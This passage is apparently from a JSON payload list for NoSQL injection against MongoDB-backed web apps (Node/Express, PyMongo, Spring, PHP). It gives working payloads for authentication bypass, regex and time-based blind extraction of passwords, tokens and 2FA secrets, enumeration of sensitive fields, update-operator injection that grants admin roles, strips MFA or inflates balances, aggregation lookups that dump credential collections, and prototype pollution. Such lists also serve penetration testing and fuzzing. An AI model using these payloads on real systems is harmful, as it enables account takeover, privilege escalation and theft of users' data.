          "$regex": "^[A-Za-z0-9]"
        }
      },
      {
        "username": {
          "$eq": "admin"
        },
        "secret": {
          "$regex": "^[A-Za-z0-9]"
        }
      },
      {
        "username": {
          "$eq": "admin"
        },
        "resetToken": {
          "$regex": "^[a-f0-9]"
        }
      },
      {
        "username": {
          "$eq": "admin"
        },
        "otp": {
          "$regex": "^[0-9]"
        }
      },
      {
        "username": {
          "$eq": "admin"
        },
        "flag": {
          "$regex": "^CTF\\{"
        }
      },
      {
        "username": {
          "$eq": "admin"
        },
        "flag": {
          "$regex": "^CTF\\{[a-zA-Z0-9_]"
        }
      },
      {
        "username": {
          "$eq": "admin"
        },
        "sessionId": {
          "$regex": "^[A-Za-z0-9]"
        }
      },
      {
        "username": {
          "$eq": "admin"
        },
        "twoFactorSecret": {
          "$regex": "^[A-Z2-7]"
        }
      }
    ],
    "url_encoded_template": [
      "username[$ne]=toto&password[$regex]=a.{2}",
      "username[$ne]=toto&password[$regex]=b.{2}",
      "username[$ne]=toto&password[$regex]=m.{2}",
      "username[$ne]=toto&password[$regex]=md.{1}",
      "username[$ne]=toto&password[$regex]=mdp",
      "username[$ne]=toto&password[$regex]=m.*",
      "username[$ne]=toto&password[$regex]=md.*",
      "username[$ne]=toto&password[$regex]=^[a-f0-9]{32}$",
      "username[$ne]=toto&password[$regex]=^[a-f0-9]{40}$",
      "username[$ne]=toto&password[$regex]=^[a-f0-9]{64}$",
      "username[$eq]=admin&token[$regex]=^[a-f0-9]",
      "username[$eq]=admin&flag[$regex]=^CTF%7B"
    ],
    "search_endpoint_template": [
      "/?search=admin' && this.password%00",
      "/?search=admin' && this.password && this.password.match(/^a.*$/)%00",
      "/?search=admin' && this.password && this.password.match(/^b.*$/)%00",
      "/?search=admin' && this.password && this.password.match(/^c.*$/)%00",
      "/?search=admin' && this.password && this.password.match(/^[a-f0-9]{32}$/)%00",
      "/?search=admin' && this.token && this.token.match(/^.*$/)%00",
      "/?search=admin' && this.apiKey && this.apiKey.match(/^.*$/)%00",
      "/?search=admin' && this.flag && this.flag.match(/^CTF\\{.*\\}$/)%00",
      "/?search=admin' && this.flag%00",
      "/?search=admin' && this.secret%00"
    ]
  },
  "mongodb_timing_blind": {
    "description": "Time-based blind injection - all variants",
    "json_payloads": [
      {
        "$where": "sleep(5000)||true"
      },
      {
        "$where": "sleep(3000)||true"
      },
      {
        "$where": "sleep(1000)||true"
      },
      {
        "$where": "sleep(2000)||true"
      },
      {
        "$where": "sleep(10000)||true"
      },
      {
        "$where": "if(this.username=='admin'){sleep(5000)}"
      },
      {
        "$where": "if(this.username=='root'){sleep(5000)}"
      },
      {
        "$where": "if(this.password.match(/^a/)){sleep(3000)}"
      },
      {
        "$where": "if(this.password.match(/^[a-f]/)){sleep(3000)}else{return true;}"
      },
      {
        "$where": "if(this.role=='admin'){sleep(5000)}else{return true;}"
      },
      {
        "$where": "if(this.isAdmin==true){sleep(5000)}"
      },
      {
        "$where": "if(this.password.length==32){sleep(3000)}"
      },
      {
        "$where": "if(this.password.length==40){sleep(3000)}"
      },
      {
        "$where": "if(this.password.length==64){sleep(3000)}"
      },
      {
        "$where": "if(typeof this.flag!=='undefined'){sleep(5000)}"
      },
      {
        "$where": "if(this.flag && this.flag.startsWith('CTF')){sleep(5000)}"
      },
      {
        "$where": "var t=new Date();while(new Date()-t<5000);return true;"
      },
      {
        "$where": "function(){var s=new Date().getTime();while(new Date().getTime()<s+5000){}; return true;}()"
      },
      {
        "username": "admin",
        "$where": "sleep(3000)||true"
      },
      {
        "$where": "this.username=='admin'&&sleep(2000)||true"
      },
      {
        "$where": "if(this.token){sleep(5000)}"
      },
      {
        "$where": "if(this.apiKey){sleep(5000)}"
      },
      {
        "$where": "if(this.secret){sleep(5000)}"
      },
      {
        "$where": "if(this.otp){sleep(3000)}"
      },
      {
        "$where": "if(this.resetToken){sleep(3000)}"
      }
    ],
    "string_payloads": [
      "';sleep(5000);",
      "';sleep(3000);",
      "';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);",
      "'; var d=new Date(); var t=d.getTime(); while(d.getTime()<t+5000){d=new Date()}; x='",
      "' && (function(){var d=new Date();while(new Date()-d<5000){}})() && '1'=='1",
      "'; var start=new Date().getTime(); while(new Date().getTime()-start<5000){}; var x='",
      "' || (function(){var s=Date.now();while(Date.now()-s<5000){}return true})() || '"
    ]
  },
  "mongodb_field_enumeration": {
    "description": "Field name and document structure enumeration",
    "common_fields": [
      {
        "$where": "typeof this.password !== 'undefined'"
      },
      {
        "$where": "typeof this.token !== 'undefined'"
      },
      {
        "$where": "typeof this.secret !== 'undefined'"
      },
      {
        "$where": "typeof this.apiKey !== 'undefined'"
      },
      {
        "$where": "typeof this.api_key !== 'undefined'"
      },
      {
        "$where": "typeof this.hash !== 'undefined'"
      },
      {
        "$where": "typeof this.salt !== 'undefined'"
      },
      {
        "$where": "typeof this.email !== 'undefined'"
      },
      {
        "$where": "typeof this.role !== 'undefined'"
      },
      {
        "$where": "typeof this.admin !== 'undefined'"
      },
      {
        "$where": "typeof this.flag !== 'undefined'"
      },
      {
        "$where": "typeof this.key !== 'undefined'"
      },
      {
        "$where": "typeof this.resetToken !== 'undefined'"
      },
      {
        "$where": "typeof this.twoFactorSecret !== 'undefined'"
      },
      {
        "$where": "typeof this.two_factor_secret !== 'undefined'"
      },
      {
        "$where": "typeof this.privateKey !== 'undefined'"
      },
      {
        "$where": "typeof this.private_key !== 'undefined'"
      },
      {
        "$where": "typeof this.sessionId !== 'undefined'"
      },
      {
        "$where": "typeof this.session_id !== 'undefined'"
      },
      {
        "$where": "typeof this.otp !== 'undefined'"
      },
      {
        "$where": "typeof this.backupCode !== 'undefined'"
      },
      {
        "$where": "typeof this.backup_code !== 'undefined'"
      },
      {
        "$where": "typeof this.creditCard !== 'undefined'"
      },
      {
        "$where": "typeof this.credit_card !== 'undefined'"
      },
      {
        "$where": "typeof this.ssn !== 'undefined'"
      },
      {
        "$where": "typeof this.phone !== 'undefined'"
      },
      {
        "$where": "typeof this.dob !== 'undefined'"
      },
      {
        "$where": "typeof this.address !== 'undefined'"
      },
      {
        "$where": "typeof this.secret_question !== 'undefined'"
      },
      {
        "$where": "typeof this.answer !== 'undefined'"
      },
      {
        "$where": "typeof this.pin !== 'undefined'"
      },
      {
        "$where": "typeof this.permissions !== 'undefined'"
      },
      {
        "$where": "typeof this.privilege !== 'undefined'"
      },
      {
        "$where": "typeof this.access_level !== 'undefined'"
      },
      {
        "$where": "typeof this.access !== 'undefined'"
      },
      {
        "$where": "typeof this.scope !== 'undefined'"
      },
      {
        "$where": "typeof this.jwt !== 'undefined'"
      },
      {
        "$where": "typeof this.refresh_token !== 'undefined'"
      },
      {
        "$where": "typeof this.refreshToken !== 'undefined'"
      }
    ],
    "role_probes": [
      {
        "$where": "this.role == 'admin'"
      },
      {
        "$where": "this.role == 'superadmin'"
      },
      {
        "$where": "this.role == 'root'"
      },
      {
        "$where": "this.role == 'owner'"
      },
      {
        "$where": "this.role == 'manager'"
      },
      {
        "$where": "this.role == 'moderator'"
      },
      {
        "$where": "this.role == 'staff'"
      },
      {
        "$where": "this.role == 'super'"
      },
      {
        "$where": "this.isAdmin == true"
      },
      {
        "$where": "this.admin == true"
      },
      {
        "$where": "this.is_admin == true"
      },
      {
        "$where": "this.is_superadmin == true"
      },
      {
        "$where": "this.level > 5"
      },
      {
        "$where": "this.level > 9"
      },
      {
        "$where": "this.level >= 10"
      },
      {
        "$where": "this.level == 99"
      },
      {
        "$where": "this.level == 100"
      },
      {
        "$where": "this.privilege == 'admin'"
      },
      {
        "$where": "this.access_level > 5"
      },
      {
        "$where": "this.permissions.indexOf('admin') >= 0"
      }
    ],
    "structure_enumeration": [
      {
        "$where": "Object.keys(this).length > 0"
      },
      {
        "$where": "Object.keys(this).length > 3"
      },
      {
        "$where": "Object.keys(this).length > 5"
      },
      {
        "$where": "Object.keys(this).length > 10"
      },
      {
        "$where": "Object.keys(this).join(',').includes('pass')"
      },
      {
        "$where": "Object.keys(this).join(',').includes('flag')"
      },
      {
        "$where": "Object.keys(this).join(',').includes('token')"
      },
      {
        "$where": "Object.keys(this).join(',').includes('secret')"
      },
      {
        "$where": "Object.keys(this).join(',').includes('key')"
      },
      {
        "$where": "Object.keys(this).join(',').includes('admin')"
      },
      {
        "$where": "Object.keys(this).join(',').includes('role')"
      },
      {
        "$where": "Object.keys(this).join(',').includes('hash')"
      },
      {
        "$where": "JSON.stringify(this).includes('admin')"
      },
      {
        "$where": "JSON.stringify(this).includes('flag')"
      },
      {
        "$where": "JSON.stringify(this).includes('secret')"
      },
      {
        "$where": "JSON.stringify(this).includes('token')"
      },
      {
        "$where": "JSON.stringify(this).length > 100"
      },
      {
        "$where": "JSON.stringify(this).length > 200"
      },
      {
        "$where": "JSON.stringify(this).length > 500"
      }
    ]
  },
  "mongodb_update_operator_injection": {
    "description": "Injection into MongoDB update operations",
    "set_operations": [
      {
        "$set": {
          "role": "admin"
        }
      },
      {
        "$set": {
          "isAdmin": true
        }
      },
      {
        "$set": {
          "is_admin": true
        }
      },
      {
        "$set": {
          "admin": true
        }
      },
      {
        "$set": {
          "password": "hacked"
        }
      },
      {
        "$set": {
          "password": "password"
        }
      },
      {
        "$set": {
          "password": "admin"
        }
      },
      {
        "$set": {
          "email": "attacker@evil.com"
        }
      },
      {
        "$set": {
          "role": "admin",
          "isAdmin": true
        }
      },
      {
        "$set": {
          "role": "superadmin"
        }
      },
      {
        "$set": {
          "level": 99
        }
      },
      {
        "$set": {
          "level": 100
        }
      },
      {
        "$set": {
          "access_level": 9
        }
      },
      {
        "$set": {
          "privilege": "admin"
        }
      },
      {
        "$set": {
          "permissions": [
            "admin",
            "read",
            "write",
            "delete"
          ]
        }
      },
      {
        "$set": {
          "scope": "admin"
        }
      },
      {
        "$set": {
          "active": true
        }
      },
      {
        "$set": {
          "verified": true
        }
      },
      {
        "$set": {
          "confirmed": true
        }
      },
      {
        "$set": {
          "twoFactor": false
        }
      },
      {
        "$set": {
          "mfa": false
        }
      },
      {
        "$set": {
          "twoFactorEnabled": false
        }
      },
      {
        "$set": {
          "locked": false
        }
      },
      {
        "$set": {
          "banned": false
        }
      },
      {
        "$set": {
          "deleted": false
        }
      }
    ],
    "unset_operations": [
      {
        "$unset": {
          "2fa": 1
        }
      },
      {
        "$unset": {
          "mfa": 1
        }
      },
      {
        "$unset": {
          "twoFactorSecret": 1
        }
      },
      {
        "$unset": {
          "two_factor_secret": 1
        }
      },
      {
        "$unset": {
          "otp": 1
        }
      },
      {
        "$unset": {
          "resetToken": 1
        }
      },
      {
        "$unset": {
          "reset_token": 1
        }
      },
      {
        "$unset": {
          "locked": 1
        }
      },
      {
        "$unset": {
          "banned": 1
        }
      },
      {
        "$unset": {
          "deleted": 1
        }
      },
      {
        "$unset": {
          "password": 1
        }
      }
    ],
    "numeric_operations": [
      {
        "$inc": {
          "balance": 9999999
        }
      },
      {
        "$inc": {
          "credits": 99999
        }
      },
      {
        "$inc": {
          "points": 9999999
        }
      },
      {
        "$inc": {
          "score": 9999
        }
      },
      {
        "$inc": {
          "tokens": 99999
        }
      },
      {
        "$mul": {
          "balance": 1000
        }
      },
      {
        "$mul": {
          "credits": 1000
        }
      },
      {
        "$bit": {
          "flags": {
            "or": 1
          }
        }
      }
    ],
    "array_operations": [
      {
        "$push": {
          "roles": "admin"
        }
      },
      {
        "$addToSet": {
          "permissions": "admin"
        }
      },
      {
        "$addToSet": {
          "roles": "admin"
        }
      },
      {
        "$pull": {
          "blacklist": "attacker@evil.com"
        }
      },
      {
        "$push": {
          "groups": "admins"
        }
      }
    ],
    "misc_operations": [
      {
        "$rename": {
          "password": "oldpassword"
        }
      },
      {
        "$currentDate": {
          "lastModified": true
        }
      },
      {
        "$min": {
          "failed_logins": 0
        }
      },
      {
        "$max": {
          "level": 100
        }
      }
    ],
    "url_encoded": [
      "update[$set][role]=admin",
      "update[$set][isAdmin]=true",
      "data[$set][password]=hacked",
      "update[$unset][twoFactorSecret]=1",
      "data[$inc][balance]=9999999",
      "update[$push][roles]=admin",
      "update[$set][role]=admin&update[$set][isAdmin]=true",
      "update[$set][level]=99",
      "update[$unset][mfa]=1"
    ]
  },
  "mongodb_aggregation_injection": {
    "description": "Injection via aggregation pipeline operators",
    "lookup_payloads": [
      [
        {
          "$lookup": {
            "from": "users",
            "as": "result",
            "pipeline": [
              {
                "$match": {
                  "password": {
                    "$regex": "^.*"
                  }
                }
              }
            ]
          }
        }
      ],
      [
        {
          "$lookup": {
            "from": "users",
            "as": "result",
            "pipeline": [
              {
                "$match": {}
              }
            ]
          }
        }
      ],
      [
        {
          "$lookup": {
            "from": "admin",
            "as": "result",
            "pipeline": [
              {
                "$match": {
                  "username": {
                    "$ne": ""
                  }
                }
              }
            ]
          }
        }
      ],
      [
        {
          "$lookup": {
            "from": "sessions",
            "as": "result",
            "pipeline": [
              {
                "$match": {
                  "token": {
                    "$ne": ""
                  }
                }
              }
            ]
          }
        }
      ],
      [
        {
          "$lookup": {
            "from": "users",
            "as": "result",
            "localField": "_id",
            "foreignField": "userId"
          }
        }
      ],
      [
        {
          "$match": {}
        },
        {
          "$lookup": {
            "from": "users",
            "as": "r",
            "pipeline": [
              {
                "$match": {
                  "role": "admin"
                }
              }
            ]
          }
        }
      ],
      [
        {
          "$lookup": {
            "from": "secrets",
            "as": "r",
            "pipeline": [
              {
                "$match": {}
              }
            ]
          }
        }
      ],
      [
        {
          "$lookup": {
            "from": "flags",
            "as": "r",
            "pipeline": [
              {
                "$match": {}
              }
            ]
          }
        }
      ],
      [
        {
          "$lookup": {
            "from": "config",
            "as": "r",
            "pipeline": [
              {
                "$match": {}
              }
            ]
          }
        }
      ],
      [
        {
          "$lookup": {
            "from": "credentials",
            "as": "r",
            "pipeline": [
              {
                "$match": {}
              }
            ]
          }
        }
      ],
      [
        {
          "$lookup": {
            "from": "api_keys",
            "as": "r",
            "pipeline": [
              {
                "$match": {}
              }
            ]
          }
        }
      ]
    ],
    "union_merge_out": [
      [
        {
          "$unionWith": {
            "coll": "users",
            "pipeline": [
              {
                "$match": {}
              }
            ]
          }
        }
      ],
      [
        {
          "$unionWith": {
            "coll": "admins",
            "pipeline": [
              {
                "$match": {}
              }
            ]
          }
        }
      ],
      [
        {
          "$unionWith": {
            "coll": "secrets",
            "pipeline": [
              {
                "$match": {}
              }
            ]
          }
        }
      ],
      [
        {
          "$out": "pwned_collection"
        }
      ],
      [
        {
          "$out": "attacker_data"
        }
      ],
      [
        {
          "$merge": {
            "into": "pwned",
            "on": "_id"
          }
        }
      ],
      [
        {
          "$merge": {
            "into": {
              "db": "admin",
              "coll": "pwned"
            },
            "on": "_id"
          }
        }
      ]
    ],
    "admin_commands": [
      [
        {
          "$currentOp": {
            "allUsers": true,
            "idleConnections": true
          }
        }
      ],
      [
        {
          "$listLocalSessions": {
            "allUsers": true
          }
        }
      ],
      [
        {
          "$listSessions": {
            "allUsers": true
          }
        }
      ],
      [
        {
          "$planCacheStats": {}
        }
      ],
      [
        {
          "$indexStats": {}
        }
      ],
      [
        {
          "$collStats": {
            "latencyStats": {
              "histograms": true
            }
          }
        }
      ]
    ],
    "function_accumulator": [
      {
        "$function": {
          "body": "function(){return db.version();}",
          "args": [],
          "lang": "js"
        }
      },
      {
        "$function": {
          "body": "function(){return db.adminCommand({listDatabases:1}).databases.map(d=>d.name).join(',');}",
          "args": [],
          "lang": "js"
        }
      },
      {
        "$accumulator": {
          "init": "function(){return {};}",
          "accumulate": "function(s,v){return s;}",
          "accumulateArgs": [
            "$_id"
          ],
          "merge": "function(s1,s2){return s1;}",
          "finalize": "function(s){return db.version();}",
          "lang": "js"
        }
      }
    ],
    "graphlookup": [
      [
        {
          "$graphLookup": {
            "from": "users",
            "startWith": "$_id",
            "connectFromField": "_id",
            "connectToField": "_id",
            "as": "r"
          }
        }
      ],
      [
        {
          "$graphLookup": {
            "from": "roles",
            "startWith": "$role",
            "connectFromField": "role",
            "connectToField": "name",
            "as": "role_chain"
          }
        }
      ]
    ]
  },
  "mongodb_objectid_injection": {
    "description": "ObjectId-based injection for IDOR and record enumeration",
    "json_payloads": [
      {
        "_id": {
          "$ne": null
        }
      },
      {
        "_id": {
          "$exists": true
        }
      },
      {
        "_id": {
          "$gt": "000000000000000000000000"
        }
      },
      {
        "_id": {
          "$gte": "000000000000000000000000"
        }
      },
      {
        "_id": {
          "$regex": "^[a-f0-9]{24}$"
        }
      },
      {
        "_id": {
          "$in": [
            "000000000000000000000001",
            "000000000000000000000002"
          ]
        }
      },
      {
        "_id": {
          "$type": 7
        }
      },
      {
        "_id": {
          "$type": "objectId"
        }
      },
      {
        "_id": {
          "$lt": "ffffffffffffffffffffffff"
        }
      },
      {
        "_id": {
          "$ne": "000000000000000000000000"
        }
      },
      {
        "id": {
          "$ne": null
        }
      },
      {
        "id": {
          "$gt": 0
        }
      },
      {
        "id": {
          "$gte": 1
        }
      },
      {
        "id": {
          "$lt": 9999999
        }
      },
      {
        "id": {
          "$ne": -1
        }
      },
      {
        "id": {
          "$ne": "0"
        }
      },
      {
        "id": {
          "$in": [
            1,
            2,
            3,
            100,
            1000
          ]
        }
      },
      {
        "id": {
          "$regex": ".*"
        }
      },
      {
        "id": {
          "$exists": true
        }
      },
      {
        "uid": {
          "$ne": null
        }
      },
      {
        "uid": {
          "$gt": 0
        }
      },
      {
        "userId": {
          "$ne": null
        }
      },
      {
        "userId": {
          "$gt": ""
        }
      },
      {
        "user_id": {
          "$ne": null
        }
      },
      {
        "user_id": {
          "$gt": 0
        }
      }
    ],
    "url_encoded": [
      "_id[$ne]=000000000000000000000000",
      "_id[$exists]=true",
      "_id[$gt]=000000000000000000000000",
      "_id[$lt]=ffffffffffffffffffffffff",
      "id[$ne]=0",
      "id[$gt]=0",
      "id[$gte]=1",
      "id[$lt]=99999",
      "id[$in][0]=1&id[$in][1]=2&id[$in][2]=3",
      "uid[$ne]=null",
      "userId[$ne]=null",
      "user_id[$gt]=0"
    ]
  },
  "mongodb_comment_injection": {
    "description": "Comment operators to truncate or modify queries",
    "payloads": [
      "admin'//",
      "admin'/*",
      "admin'%00",
      "admin' || 1==1//",
      "admin' || 1==1%00",
      "admin'--",
      "'; //",
      "'; /*",
      "' || 1==1//",
      "' || 1==1%00",
      "admin' || true//",
      "admin' || true%00",
      "x' || ''=='",
      "' || '' == '",
      "admin'||'1'=='1",
      "admin'#",
      "admin'%23",
      "'; return 1; //",
      "' || this.password // ",
      "'; return this; //",
      "' || '\\0",
      "admin'\\0",
      "' || \"1\"==\"1",
      "'; return {}; //",
      "' || ({}) || '",
      "' || [] || '",
      "admin'%0a//",
      "admin'%0d//",
      "admin'%09//",
      "'; \r\n return true; \r\n //"
    ]
  },
  "mongodb_misc_operators": {
    "description": "Miscellaneous operators - $type, $mod, $size, $all, $elemMatch, $not",
    "json_payloads": [
      {
        "username": {
          "$type": 2
        },
        "password": {
          "$type": 2
        }
      },
      {
        "username": {
          "$type": "string"
        },
        "password": {
          "$type": "string"
        }
      },
      {
        "username": {
          "$type": 2
        },
        "password": {
          "$gt": ""
        }
      },
      {
        "username": {
          "$mod": [
            1,
            0
          ]
        },
        "password": {
          "$gt": ""
        }
      },
      {
        "username": {
          "$mod": [
            2,
            0
          ]
        },
        "password": {
          "$gt": ""
        }
      },
      {
        "username": {
          "$mod": [
            2,
            1
          ]
        },
        "password": {
          "$gt": ""
        }
      },
      {
        "roles": {
          "$size": 1
        },
        "password": {
          "$gt": ""
        }
      },
      {
        "roles": {
          "$size": {
            "$gt": 0
          }
        },
        "password": {
          "$gt": ""
        }
      },
      {
        "username": {
          "$all": [
            "admin"
          ]
        },
        "password": {
          "$gt": ""
        }
      },
      {
        "roles": {
          "$all": [
            "admin"
          ]
        },
        "password": {
          "$gt": ""
        }
      },
      {
        "roles": {
          "$elemMatch": {
            "$eq": "admin"
          }
        },
        "password": {
          "$gt": ""
        }
      },
      {
        "permissions": {
          "$elemMatch": {
            "$eq": "admin"
          }
        },
        "password": {
          "$gt": ""
        }
      },
      {
        "username": {
          "$not": {
            "$eq": "invalid"
          }
        },
        "password": {
          "$gt": ""
        }
      },
      {
        "username": {
          "$not": {
            "$gt": "z"
          }
        },
        "password": {
          "$gt": ""
        }
      },
      {
        "username": {
          "$not": {
            "$regex": "nonexistent"
          }
        },
        "password": {
          "$gt": ""
        }
      },
      {
        "username": {
          "$comment": "injected",
          "$gt": ""
        },
        "password": {
          "$gt": ""
        }
      },
      {
        "$comment": "injection attempt",
        "username": {
          "$gt": ""
        },
        "password": {
          "$gt": ""
        }
      },
      {
        "username": {
          "$bitsAllSet": 0
        },
        "password": {
          "$gt": ""
        }
      },
      {
        "username": {
          "$bitsAnySet": 0
        },
        "password": {
          "$gt": ""
        }
      },
      {
        "username": {
          "$bitsAllClear": 0
        },
        "password": {
          "$gt": ""
        }
      }
    ]
  },
  "mongodb_prototype_pollution": {
    "description": "Prototype pollution via NoSQL injection",
    "json_payloads": [
      {
        "__proto__": {
          "$gt": ""
        }
      },
      {
        "__proto__": {
          "admin": true
        }
      },
      {
        "__proto__": {
          "isAdmin": true
        }
      },
      {
        "__proto__": {
          "role": "admin"
        }
      },
      {
        "__proto__": {
          "$ne": null
        }
      },
      {
        "__proto__": {
          "$exists": true
        }
      },
      {
        "__proto__": {
          "password": "hacked"
        }
      },
      {
        "__proto__": {
          "level": 99
        }
      },
      {
        "constructor": {
          "prototype": {
            "admin": true
          }
        }
      },
      {
        "constructor": {
          "prototype": {
            "role": "admin"
          }
        }
      },
      {
        "constructor": {
          "prototype": {
            "isAdmin": true
          }
        }
      },
      {
        "constructor": {
          "prototype": {
            "password": "hacked"
          }
        }
      },
      {
        "prototype": {
          "admin": true
        }
      },
      {
        "prototype": {
          "isAdmin": true
        }
      }
    ],
    "url_encoded": [
      "__proto__[admin]=true",
      "__proto__[role]=admin",
      "__proto__[isAdmin]=true",
      "__proto__[level]=99",
      "__proto__[$ne]=",
      "__proto__[$gt]=",
      "__proto__[password]=hacked",
      "constructor[prototype][admin]=true",
      "constructor[prototype][role]=admin",
      "constructor[prototype][isAdmin]=true",
      "constructor[prototype][password]=hacked",
      "prototype[admin]=true",
      "prototype[isAdmin]=true"
    ]
  },
  "mongodb_type_juggling": {
    "description": "Type confusion attacks on loose comparison backends",
    "json_payloads": [
      {
        "username": "admin",
        "password": true
      },
      {
        "username": "admin",
        "password": 1
      },
      {
        "username": "admin",
        "password": 0
      },
      {
        "username": "admin",
        "password": null
      },
      {
        "username": "admin",
        "password": []
      },
      {
        "username": "admin",
        "password": {}
      },
      {
        "username": true,
        "password": true
      },
      {
        "username": 0,
        "password": 0
      },
      {
        "username": null,
        "password": null
      },
      {
        "username": [],
        "password": []
      },
      {
        "username": {},
        "password": {}
      },
      {
        "username": "admin",
        "password": [
          "password",
          "admin",
          "123456"
        ]
      },
      {
        "username": "admin",
        "password": [
          true
        ]
      },
      {
        "username": "admin",
        "password": [
          null
        ]
      },
      {
        "username": "admin",
        "password": [
          0
        ]
      },
      {
        "username": "admin",
        "password": [
          ""
        ]
      },
      {
        "username": true,
        "password": null
      },
      {
        "username": null,
        "password": true
      },
      {
        "username": 1,
        "password": 1
      },
      {
        "username": -1,
        "password": -1
      },
      {
        "username": 0.0,
        "password": 0.0
      },
      {
        "username": "0",
        "password": "0"
      },
      {
        "username": "true",
        "password": "true"
      },
      {
        "username": "null",
        "password": "null"
      },
      {
        "username": "undefined",
        "password": "undefined"
      }
    ],
    "url_encoded": [
      "username=admin&password=true",
      "username=admin&password=1",
      "username=admin&password=0",
      "username=admin&password[]=",
      "username=admin&password[]=password&password[]=admin",
      "username[]=admin&password[]=password",
      "username=true&password=true",
      "username=0&password=0",
      "username=null&password=null",
      "username[]=&password[]=",
      "username=admin&password=null"
    ]
  },
  "mongodb_second_order": {
    "description": "Second-order / stored NoSQL injection",
    "registration_payloads": [
      {
        "username": {
          "$gt": ""
        },
        "email": "attacker@evil.com",
        "password": "pass123"
      },
      {
        "username": {
          "$ne": null
        },
        "bio": "normal bio",
        "password": "pass123"
      },
      {
        "username": "admin",
        "email": {
          "$regex": ".*"
        },
        "password": "pass123"
      },
      {
        "name": {
          "$where": "1==1"
        },
        "age": 25
      },
      {
        "address": {
          "$gt": ""
        },
        "city": "normalcity"
      },
      {
        "firstName": {
          "$ne": ""
        },
        "lastName": "Smith"
      },
      {
        "username": "user'; return true; //",
        "password": "pass"
      },
      {
        "username": "user' || '1'=='1",
        "password": "pass"
      },
      {
        "username": "' || this.password.match(/.*/) || 'x",
        "password": "pass"
      },
      {
        "search_query": {
          "$regex": ".*"
        },
        "limit": 10
      },
      {
        "tag": {
          "$gt": ""
        },
        "content": "normal content"
      },
      {
        "title": {
          "$ne": null
        },
        "body": "normal body"
      },
      {
        "category": {
          "$regex": ".*"
        },
        "description": "normal desc"
      },
      {
        "comment": "'; return true; //",
        "author": "normal"
      },
      {
        "bio": {
          "$where": "1==1"
        },
        "location": "normal location"
      },
      {
        "website": {
          "$regex": ".*"
        },
        "company": "normal company"
      }
    ]
  },
  "php_array_injection": {
    "description": "PHP array-based parameter pollution for NoSQL operators",
    "payloads": [
      "username[$ne]=1&password[$ne]=1",
      "username[$eq]=admin&password[$ne]=1",
      "username[$regex]=^adm&password[$ne]=1",
      "username[$regex]=.*&password[$regex]=.*",
      "username[$exists]=true&password[$exists]=true",
      "username[$gt]=&password[$gt]=",
      "username[$gte]=&password[$gte]=",
      "username[$lt]=z&password[$lt]=z",
      "username[$in][0]=admin&username[$in][1]=root&password[$gt]=",
      "username[$nin][0]=notexist&password[$nin][0]=notexist",
      "username[$not][$eq]=x&password[$not][$eq]=x",
      "username[$where]=this.username!='x'&password[$where]=this.password!='x'",
      "data[$where]=1==1",
      "filter[$ne]=x",
      "query[$gt]=",
      "username[$all][0]=admin&password[$gt]=",
      "username[$not][$in][0]=guest&password[$ne]=x",
      "username[$elemMatch][$gt]=&password[$gt]=",
      "username[$nor][0][$eq]=notexist&password[$gt]=",
      "username[$type]=2&password[$gt]=",
      "username[$mod][0]=1&username[$mod][1]=0&password[$gt]=",
      "username[$regex]=^admin&username[$options]=i&password[$regex]=.*",
      "login[$ne]=x&pass[$ne]=x",
      "email[$ne]=x@x.com&password[$ne]=x",
      "user[$ne]=x&pwd[$ne]=x",
      "uname[$regex]=.*&passwd[$regex]=.*",
      "username[$ne]=0&username[$ne]=false&password[$gt]=",
      "username[$and][0][$ne]=x&username[$and][1][$ne]=y&password[$gt]=",
      "username[$or][0][$eq]=admin&username[$or][1][$eq]=root&password[$gt]=",
      "username[$nor][0][$eq]=banned&username[$nor][1][$eq]=deleted&password[$gt]="
    ]
  },
  "nodejs_express_injection": {
    "description": "Node.js / Express.js specific injection patterns",
    "body_parser_payloads": [
      "username=admin&password[$ne]=wrongpassword",
      "username[$regex]=admin&password[$ne]=x",
      "username[$exists]=true&password[$gt]=",
      "username=admin&password[$gt]=",
      "username[$ne]=x&password[$ne]=x&remember=true",
      "username[$gt]=&password[$gt]=&_method=POST",
      "username[$ne]=null&password[$ne]=null&csrf=bypass"
    ],
    "json_content_type_payloads": [
      {
        "username": {
          "$ne": null
        },
        "password": {
          "$ne": null
        },
        "remember": true
      },
      {
        "username": {
          "$regex": ".*"
        },
        "password": {
          "$gt": ""
        },
        "captcha": "bypass"
      },
      {
        "user": {
          "$ne": ""
        },
        "pass": {
          "$ne": ""
        },
        "2fa": "000000"
      },
      {
        "username": "admin",
        "password": {
          "$ne": "wrong"
        },
        "token": {
          "$exists": false
        }
      },
      {
        "username": {
          "$gt": ""
        },
        "password": {
          "$gt": ""
        },
        "role": {
          "$ne": "guest"
        }
      }
    ],
    "query_string_payloads": [
      "?username[$ne]=x&password[$ne]=x",
      "?user[$gt]=&pass[$gt]=",
      "?login[$regex]=.*&password[$regex]=.*",
      "?username[$ne]=null&password[$exists]=true",
      "?id[$ne]=0",
      "?_id[$ne]=null",
      "?id[$gt]=0&id[$lt]=999999",
      "?filter[$ne]=x",
      "?q[$regex]=.*",
      "?search[$ne]=null",
      "?name[$regex]=.*&role[$eq]=admin",
      "?email[$regex]=.*%40.*"
    ]
  },
  "python_pymongo_injection": {
    "description": "Python PyMongo specific injection patterns",
    "payloads": [
      {
        "username": {
          "$ne": null
        },
        "password": {
          "$ne": null
        }
      },
      {
        "username": {
          "$gt": ""
        },
        "password": {
          "$gt": ""
        }
      },
      {
        "username": {
          "$regex": ".*"
        },
        "password": {
          "$regex": ".*"
        }
      },
      {
        "username": {
          "$exists": true
        },
        "password": {
          "$exists": true
        }
      },
      "{'username': {'$ne': None}, 'password': {'$ne': None}}",
      "{'username': {'$gt': ''}, 'password': {'$gt': ''}}",
      "{'$where': '1==1'}",
      "{'$where': 'true'}",
      "{'$or': [{}, {'a': 'a'}]}",
      "{'username': {'$in': ['admin', 'root']}, 'password': {'$gt': ''}}"
    ]
  },
  "java_spring_injection": {
    "description": "Java Spring Data MongoDB injection patterns",
    "payloads": [
      {
        "username": {
          "$ne": ""
        },
        "password": {
          "$ne": ""
        }
      },
      {
        "username": {
          "$regex": ".*"
        },
        "password": {
          "$regex": ".*"
        }
      },
      {
        "username": "admin",
        "password": {
          "$gt": ""
        }
      },
      {
        "username": {
          "$exists": true
        },
        "password": {
          "$exists": true
        }
      },
      "username=%7B%22%24ne%22%3A+%22%22%7D&password=%7B%22%24ne%22%3A+%22%22%7D",
      "username={\"$ne\": \"\"}&password={\"$ne\": \"\"}",
      "{\"username\":{\"$regex\":\".*\"},\"password\":{\"$regex\":\".*\"}}",
      "{\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}"
    ]
  },
  "graphql_nosql_injection": {
